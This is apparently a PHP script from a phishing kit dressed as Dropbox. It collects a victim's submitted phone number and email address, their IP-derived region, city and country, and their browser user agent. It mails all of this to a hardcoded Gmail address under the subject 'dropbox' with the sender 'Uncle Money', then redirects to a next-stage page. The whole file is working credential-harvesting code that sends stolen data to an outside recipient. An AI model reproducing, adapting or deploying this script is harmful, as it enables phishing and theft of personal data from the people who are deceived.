<?php
session_start();
require_once('geoplugin.class.php');
$geoplugin = new geoPlugin();

$geoplugin->locate();
$ip = getenv("REMOTE_ADDR");
$region = $geoplugin->region;
$city = $geoplugin->city;
$country = $geoplugin->countryName;

$mob = trim($_POST['mob']);
$recmay = trim($_POST['recmay']);

$ip = getenv("REMOTE_ADDR");
$message .= "Mob: ".$mob."\n";
$message .= "Emal: ".$recmay."\n";
$message .= "IP : ".$ip."\n";
$message .= "Region : ".$region."\n";
$message .= "City : ".$city."\n";
$message .= "Country : ".$country."\n";
$message .= "User Agent: ".$_SERVER['HTTP_USER_AGENT']."\n";
$send = "michaelroland1801@gmail.com";
$subject = "dropbox";
$headers = "From: Uncle Money";
mail($send,$subject,$message,$headers);
header("Location: db3.php");

?>